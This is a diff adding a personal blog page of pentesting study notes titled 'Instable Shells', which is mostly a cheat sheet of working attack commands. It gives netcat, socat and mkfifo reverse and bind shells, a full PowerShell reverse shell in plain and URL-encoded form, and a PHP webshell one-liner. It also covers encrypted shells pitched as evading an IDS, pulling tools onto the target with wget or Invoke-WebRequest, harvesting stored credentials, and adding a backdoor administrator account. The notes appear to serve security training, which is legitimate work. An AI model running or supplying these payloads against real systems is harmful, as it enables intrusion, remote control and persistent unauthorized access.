@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/rainou/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=rainou/livereload" data-no-instant defer></script>
+  <title>
+  Instable Shells · Rain Notes
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rain Ou">
+<meta name="description" content="
+  Shells
+  
+    
+    Link to heading
+  
+
+These cheat sheet include different code language for reverse shell
+
+Reverse Shell Cheat Sheet 1
+Reverse Shell Cheat Sheet 2
+infosec wordlist and useful code for shell
+Main tools
+
+Netcat: the traditional Swiss Army Knife, ready out of the box; nc -lvnp [port]
+Socat: Netcat&#43;, difficult syntax&#43;not installed by default
+Metasploit: multi/handler; &ldquo;multipreter&rdquo;
+Msfvenom; msfvenom -p [payload] &lt;options&gt;
+
+msfvenom -p [payload] lhost=[lhost] lport=[lport]
+
+
+
+
+This is more about when connecting to a empty port, the port doesn&rsquo;t know what its doing when connected via empty port, terminal shells connected via empty port are fragile, thus the requirement of running commands to stabilize the terminal using the available resource is a must when using reverse/bind shell.
+Change terminal tty size using stty -a,  then use the following command to resize
+
+stty rows &lt;number&gt;
+stty cols &lt;number&gt;
+
+
+
+
+  Netcat
+  
+    
+    Link to heading
+  
+
+
+opening a port and listen for the connection
+Netcat is the &ldquo;Swiss Army Knife&rdquo; of networking, installed by default. Socat is the upgrade version of netcat, but hard to use and NOT installed by default.
+Opening a port on local computer nc -lvnp &lt;port-number&gt;
+
+port below 1024 requries sudo priviledge e.g. sudo nc -lvnp 443
+
+
+Looking a bind shell on the target machine nc &lt;target-ip&gt; &lt;chosen-port&gt;
+Has a -e option to auto execute the command upon connection nc -lvnp &lt;PORT&gt; -e /bin/bash for bind or nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash for reverse. However, this is not included in most version
+
+Included in /usr/share/windows-resources/binaries in kali
+netcat-traditional in kali does include -e version
+
+
+
+
+  Three way to stabilize shell
+  
+    
+    Link to heading
+  
+
+
+  Method 1: Python shell
+  
+    
+    Link to heading
+  
+
+
+manual netcat &#43; manual stabilizer
+when shell is connected via netcat
+
+
+// Use python2 or python3 depending on the system to spawn a better featured bash shell
+python -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;
+// access to command such as clear
+export TERM=xterm
+// finally (and most importantly) we will background the shell using Ctrl &#43; Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl &#43; C to kill processes). It then foregrounds the shell, thus completing the process.
+stty raw -echo; fg&gt;
+">
+<meta name="keywords" content="notes,cybersecurity,music,share">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Instable Shells">
+  <meta name="twitter:description" content="Shells Link to heading These cheat sheet include different code language for reverse shell
+Reverse Shell Cheat Sheet 1 Reverse Shell Cheat Sheet 2 infosec wordlist and useful code for shell Main tools Netcat: the traditional Swiss Army Knife, ready out of the box; nc -lvnp [port] Socat: Netcat&#43;, difficult syntax&#43;not installed by default Metasploit: multi/handler; “multipreter” Msfvenom; msfvenom -p [payload] &lt;options&gt; msfvenom -p [payload] lhost=[lhost] lport=[lport] This is more about when connecting to a empty port, the port doesn’t know what its doing when connected via empty port, terminal shells connected via empty port are fragile, thus the requirement of running commands to stabilize the terminal using the available resource is a must when using reverse/bind shell. Change terminal tty size using stty -a, then use the following command to resize stty rows &lt;number&gt; stty cols &lt;number&gt; Netcat Link to heading opening a port and listen for the connection Netcat is the “Swiss Army Knife” of networking, installed by default. Socat is the upgrade version of netcat, but hard to use and NOT installed by default. Opening a port on local computer nc -lvnp &lt;port-number&gt; port below 1024 requries sudo priviledge e.g. sudo nc -lvnp 443 Looking a bind shell on the target machine nc &lt;target-ip&gt; &lt;chosen-port&gt; Has a -e option to auto execute the command upon connection nc -lvnp &lt;PORT&gt; -e /bin/bash for bind or nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash for reverse. However, this is not included in most version Included in /usr/share/windows-resources/binaries in kali netcat-traditional in kali does include -e version Three way to stabilize shell Link to heading Method 1: Python shell Link to heading manual netcat &#43; manual stabilizer when shell is connected via netcat // Use python2 or python3 depending on the system to spawn a better featured bash shell python -c ‘import pty;pty.spawn(&#34;/bin/bash&#34;)’ // access to command such as clear export TERM=xterm // finally (and most importantly) we will background the shell using Ctrl &#43; Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl &#43; C to kill processes). It then foregrounds the shell, thus completing the process. stty raw -echo; fg&gt;">
+
+<meta property="og:url" content="http://localhost:1313/rainou/cyber/instable-shells/">
+  <meta property="og:site_name" content="Rain Notes">
+  <meta property="og:title" content="Instable Shells">
+  <meta property="og:description" content="Shells Link to heading These cheat sheet include different code language for reverse shell
+Reverse Shell Cheat Sheet 1 Reverse Shell Cheat Sheet 2 infosec wordlist and useful code for shell Main tools Netcat: the traditional Swiss Army Knife, ready out of the box; nc -lvnp [port] Socat: Netcat&#43;, difficult syntax&#43;not installed by default Metasploit: multi/handler; “multipreter” Msfvenom; msfvenom -p [payload] &lt;options&gt; msfvenom -p [payload] lhost=[lhost] lport=[lport] This is more about when connecting to a empty port, the port doesn’t know what its doing when connected via empty port, terminal shells connected via empty port are fragile, thus the requirement of running commands to stabilize the terminal using the available resource is a must when using reverse/bind shell. Change terminal tty size using stty -a, then use the following command to resize stty rows &lt;number&gt; stty cols &lt;number&gt; Netcat Link to heading opening a port and listen for the connection Netcat is the “Swiss Army Knife” of networking, installed by default. Socat is the upgrade version of netcat, but hard to use and NOT installed by default. Opening a port on local computer nc -lvnp &lt;port-number&gt; port below 1024 requries sudo priviledge e.g. sudo nc -lvnp 443 Looking a bind shell on the target machine nc &lt;target-ip&gt; &lt;chosen-port&gt; Has a -e option to auto execute the command upon connection nc -lvnp &lt;PORT&gt; -e /bin/bash for bind or nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash for reverse. However, this is not included in most version Included in /usr/share/windows-resources/binaries in kali netcat-traditional in kali does include -e version Three way to stabilize shell Link to heading Method 1: Python shell Link to heading manual netcat &#43; manual stabilizer when shell is connected via netcat // Use python2 or python3 depending on the system to spawn a better featured bash shell python -c ‘import pty;pty.spawn(&#34;/bin/bash&#34;)’ // access to command such as clear export TERM=xterm // finally (and most importantly) we will background the shell using Ctrl &#43; Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl &#43; C to kill processes). It then foregrounds the shell, thus completing the process. stty raw -echo; fg&gt;">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="cyber">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/rainou/cyber/instable-shells/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/rainou/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/rainou/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/rainou/">
+      Rain Notes
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/music/">Music</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rainou/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/rainou/cyber/instable-shells/">
+          Instable Shells
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="shells">
+  Shells
+  <a class="heading-link" href="#shells">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>These cheat sheet include different code language for reverse shell</p>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"  class="external-link" target="_blank" rel="noopener">Reverse Shell Cheat Sheet 1</a></li>
+<li><a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"  class="external-link" target="_blank" rel="noopener">Reverse Shell Cheat Sheet 2</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists"  class="external-link" target="_blank" rel="noopener">infosec wordlist and useful code for shell</a></li>
+<li>Main tools
+<ul>
+<li>Netcat: the traditional Swiss Army Knife, ready out of the box; <code>nc -lvnp [port]</code></li>
+<li>Socat: Netcat+, difficult syntax+not installed by default</li>
+<li>Metasploit: multi/handler; &ldquo;multipreter&rdquo;</li>
+<li>Msfvenom; <code>msfvenom -p [payload] &lt;options&gt;</code>
+<ul>
+<li><code>msfvenom -p [payload] lhost=[lhost] lport=[lport]</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>This is more about when connecting to a empty port, the port doesn&rsquo;t know what its doing when connected via empty port, terminal shells connected via empty port are fragile, thus the requirement of running commands to stabilize the terminal using the available resource is a must when using reverse/bind shell.</li>
+<li>Change terminal tty size using <code>stty -a</code>,  then use the following command to resize
+<ul>
+<li><code>stty rows &lt;number&gt;</code></li>
+<li><code>stty cols &lt;number&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="netcat">
+  Netcat
+  <a class="heading-link" href="#netcat">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>opening a port and listen for the connection</li>
+<li>Netcat is the &ldquo;Swiss Army Knife&rdquo; of networking, installed by default. Socat is the upgrade version of netcat, but hard to use and NOT installed by default.</li>
+<li>Opening a port on local computer <code>nc -lvnp &lt;port-number&gt;</code>
+<ul>
+<li>port below 1024 requries sudo priviledge e.g. <code>sudo nc -lvnp 443</code></li>
+</ul>
+</li>
+<li>Looking a bind shell on the target machine <code>nc &lt;target-ip&gt; &lt;chosen-port&gt;</code></li>
+<li>Has a <code>-e</code> option to auto execute the command upon connection <code>nc -lvnp &lt;PORT&gt; -e /bin/bash</code> for bind or <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> for reverse. However, this is not included in most version
+<ul>
+<li>Included in <code>/usr/share/windows-resources/binaries</code> in kali</li>
+<li><code>netcat-traditional</code> in kali does include -e version</li>
+</ul>
+</li>
+</ul>
+<h2 id="three-way-to-stabilize-shell">
+  Three way to stabilize shell
+  <a class="heading-link" href="#three-way-to-stabilize-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="method-1-python-shell">
+  Method 1: Python shell
+  <a class="heading-link" href="#method-1-python-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>manual netcat + manual stabilizer</li>
+<li>when shell is connected via netcat</li>
+</ul>
+<blockquote>
+<p>// Use python2 or python3 depending on the system to spawn a better featured bash shell
+python -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;
+// access to command such as clear
+export TERM=xterm
+// finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+stty raw -echo; fg&gt;
+<img src="1.png" alt="Method 1: Python"></p>
+</blockquote>
+<h3 id="method-2-rlwrap">
+  Method 2: rlwrap
+  <a class="heading-link" href="#method-2-rlwrap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>rlwrap =  Netcat +  manual stabilizer</li>
+<li>A program that give access to history, tab autocompletion and the arrow keys immediately upon receiving a shell</li>
+<li>some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.</li>
+<li>Not installed by default</li>
+<li>Installation command: <code>sudo apt install rlwrap</code></li>
+<li>Invoke listener: <code>rlwrap nc -lvnp &lt;port&gt;</code></li>
+<li>Useful when dealing with Windows shells</li>
+<li>Can use the same technique as method 1 to completely stabilize shell: background the shell with <code>Ctrl + Z</code>, then use <code>stty raw -echo; fg</code> to stabilise and re-enter the shell</li>
+</ul>
+<h3 id="method-3-socat">
+  Method 3: Socat
+  <a class="heading-link" href="#method-3-socat">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Socat = Netcat + auto stabilizer</li>
+<li>Limited to linux target who has socat installed</li>
+<li>Has to transfer <a href="https://github.com/danielmiessler/SecLists"  class="external-link" target="_blank" rel="noopener">socat static compiled library</a> to the target machine,
+<ul>
+<li>Local, start a server using <code>sudo python3 -m http.server 80</code></li>
+<li>Download on remote machine using <code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code></li>
+</ul>
+</li>
+<li>Windows can be done with Powershell, using either <code>Invoke-WebRequest</code> or a <code>webrequest system</code>
+<ul>
+<li>e.g. <code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="socat">
+  Socat
+  <a class="heading-link" href="#socat">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="stable-reverse-shell">
+  Stable Reverse Shell
+  <a class="heading-link" href="#stable-reverse-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="tty-shell">
+  tty shell
+  <a class="heading-link" href="#tty-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><code>&quot;socat TCP-L:&lt;port&gt; FILE:'tty',raw,echo=0&quot;</code>
+<ul>
+<li>connecting two points: listening port, and a file
+<ul>
+<li>passing in the current TTY as a file and setting the echo to be zero</li>
+<li>equivalent to using the Ctrl + Z,</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>stty raw -echo; fg</code> (must have socat installed)
+<ul>
+<li>added bonus of being immediately stable and hooking into a full tty</li>
+<li>must be activated with a very specific socat command</li>
+<li>Upload the <a href="../../../_resources/socat" >precompiled socat binary</a> to execute as normal</li>
+</ul>
+</li>
+<li><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code>
+<ul>
+<li>The first part, we&rsquo;re linking up with the listener running on our own machine.</li>
+<li>The second part of the command creates an interactive bash session with  <code>EXEC:&quot;bash -li&quot;</code>.</li>
+<li>We&rsquo;re also passing the arguments: pty, stderr, sigint, setsid and sane:</li>
+</ul>
+</li>
+</ul>
+<h3 id="stable-reverse-shell-1">
+  Stable Reverse Shell
+  <a class="heading-link" href="#stable-reverse-shell-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Local listening port: <code>socat TCP-L:&lt;port&gt;</code>, equivalent to <code>nc -lvnp &lt;port&gt;</code></li>
+<li>Window: <code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code>, this force powershell to use Unix stype standard input output</li>
+<li>Linux: <code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</code></li>
+</ul>
+<h3 id="bind-shells">
+  Bind Shells
+  <a class="heading-link" href="#bind-shells">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li>Local listening port: <code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></li>
+<li>Linux: <code>socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</code></li>
+<li>Windows: <code>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></li>
+</ul>
+<h2 id="encrypted-shells">
+  Encrypted Shells
+  <a class="heading-link" href="#encrypted-shells">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>Socat allow the creation of encrypted shell</li>
+<li>Encrypted shells can bypass an IDS</li>
+<li>can create both bind and reverse</li>
+<li>The connection will turn into encrypted connection: certification is added to the listening port so any connection to this port will require to use the set certificate to connect.</li>
+<li>Windows will also require certificates to be used with the port, so copying the PEM file across for a bind shell is required
+*Anytime using Socal, the command<code>TCP</code> can be replaced with <code>OPENSSL</code></li>
+<li><strong>Creating certificate</strong>
+<ul>
+<li>create certificate <code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code>
+<ul>
+<li>This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.</li>
+</ul>
+</li>
+<li>create .pem file <code>cat shell.key shell.crt &gt; shell.pem</code></li>
+</ul>
+</li>
+<li><strong>Reverse shell listener</strong>:
+<ul>
+<li><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</code></li>
+<li><code>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code></li>
+</ul>
+</li>
+<li><strong>bind shell</strong>:
+<ul>
+<li><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code></li>
+<li><code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code></li>
+</ul>
+</li>
+<li><strong>tty version of encrypted shell</strong>
+<ul>
+<li><code>socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:</code>tty<code>,raw,echo=0</code></li>
+<li><code>socat OPENSSL:10.10.10.5:53 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="common-shell-payload">
+  Common Shell payload
+  <a class="heading-link" href="#common-shell-payload">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>Netcat has <code>-e</code> option. However, a lot of version no longer has it</li>
+<li>In Windows, static binary is nearly always required</li>
+<li>In linux:
+<ul>
+<li>Bind shell command: <code>mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code>
+<ul>
+<li>The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.</li>
+<li>In short, automatically sends the input from the port to shell</li>
+</ul>
+</li>
+<li>Reverse Shell command <code>mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></li>
+</ul>
+</li>
+<li>In Windows Server:
+<ul>
+<li>Powershell is usually required</li>
+<li>Reverse shell command <code>powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code>
+<ul>
+<li>replace <code>&lt;IP&gt;</code> and <code>&lt;port&gt;</code> with an appropriate IP and choice of port.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"  class="external-link" target="_blank" rel="noopener">PayloadsAllTheThings, Reverse Shell Cheat Sheet</a></li>
+<li>WebShells:
+<ul>
+<li>Mostly usefull for <strong>Linux</strong></li>
+<li>PHP basic line format: <code>&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;; ?&gt;</code> (This is the webpage uploaded to web-server)
+<ul>
+<li>This will take a GET parameter in the URL and execute it on the system with <code>shell_exec</code>(). Essentially, what this means is that any commands we enter in the URL after <code>?cmd=</code> will be executed on the system &ndash; be it Windows or Linux. The &ldquo;pre&rdquo; elements are to ensure that the results are formatted correctly on the page.
+<img src="2.png" alt="Calling the script on web"></li>
+<li>There are variety of shell available on kali: <code>/usr/share/webshells</code>
+<ul>
+<li>including the infamous <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"  class="external-link" target="_blank" rel="noopener">PentestMonkey php-reverse-shell</a></li>
+<li>Notice that language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>For <strong>Windows</strong>: It is best to
+<ul>
+<li>obtain RCE using web shell. Obtain via URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:
+<ul>
+<li>(URL encoded to be used safely in a GET parameter): <code>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code>
+<ul>
+<li><code>&lt;IP&gt;</code> and <code>&lt;PORT&gt;</code> still need to be changed</li>
+</ul>
+</li>
+<li>Which is the same as <code>powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></li>
+</ul>
+</li>
+<li>use msfvenom to generate a reverse/bind shell in the language of the server</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="gain-access-to-stabilize-shell">
+  Gain access to stabilize shell
+  <a class="heading-link" href="#gain-access-to-stabilize-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<ul>
+<li>The shell payload (incomplete shell) is a way to escalate to the native shell (complete shell)</li>
+<li>All the of shell mentioned above are not stable, the best way to have a constant shell is to have a user account&rsquo;s ssh.</li>
+<li>Linux:
+<ul>
+<li>the common way is via <code>/home/&lt;user&gt;/.ssh</code></li>
+<li>or for others with writable <code>/etc/shadow</code> or <code>/etc/passwd</code></li>
+<li>or laying somewhere around</li>
+</ul>
+</li>
+<li>Windows:
+<ul>
+<li>Find password for running services in the registry
+<ul>
+<li>VNC servers often leave password in the registry stored in plaintext</li>
+<li>Some FileZilla FTP server also leave credentials in an XML file at :
+<ul>
+<li><code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code></li>
+<li><code>C:\xampp\FileZilla Server\FileZilla Server.xml</code></li>
+<li>plaintext or md5</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Idealy is to obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. Use that to add new user to gain access.
+<ul>
+<li><code>net user &lt;username&gt; &lt;password&gt; /add</code></li>
+<li><code>net localgroup administrators &lt;username&gt; /add</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2025 -
+    
+    2026
+     Rain Ou 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/rainou/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
